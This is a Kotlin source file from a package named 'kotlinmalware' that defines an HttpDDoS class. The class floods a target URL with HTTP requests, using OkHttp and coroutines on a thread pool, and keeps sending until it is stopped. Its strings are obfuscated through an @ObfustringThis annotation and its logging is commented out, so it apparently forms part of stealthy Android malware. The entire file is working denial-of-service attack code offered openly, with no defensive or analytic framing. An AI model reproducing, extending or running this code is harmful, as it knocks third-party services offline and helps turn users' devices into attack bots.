package com.example.kotlinmalware

import android.util.Log
import io.github.c0nnor263.obfustringcore.ObfustringThis
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Response
import java.io.IOException
import kotlinx.coroutines.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

@ObfustringThis
class HttpDDoS(private val url: String) {
    private val client = OkHttpClient()
    private var job: Job? = null

    private val threadCount = 4
    private val coroutineDispatcher = Executors.newFixedThreadPool(threadCount).asCoroutineDispatcher()

    fun startDDoS() {
        job = CoroutineScope(coroutineDispatcher).launch {
            try {
                while (isActive) {
                    repeat(threadCount) {
                        launch {
                            sendHttpRequest()
                        }
                    }
                    delay(10)
                }
            } catch (e: CancellationException) {
                //Log.d("HttpDDoS", "DDoS attack stopped")
            } finally {
                coroutineDispatcher.close()
            }
        }
    }

    fun stopDDoS() {
        job?.cancel()
        job = null
        coroutineDispatcher.close()
        (coroutineDispatcher.executor as? ExecutorService)?.shutdownNow()
    }

    private fun sendHttpRequest() {
        val request = Request.Builder()
            .url(url)
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                //Log.e("HttpDDoS", "Failed to send HTTP request", e)
            }

            override fun onResponse(call: Call, response: Response) {
                response.use { resp ->
                    if (!resp.isSuccessful) {
                        //Log.e("HttpDDoS", "Failed to receive a successful HTTP response")
                        return
                    }

                    //Log.d("HttpDDoS", "Received response for HTTP request")
                }
            }
        })
    }
}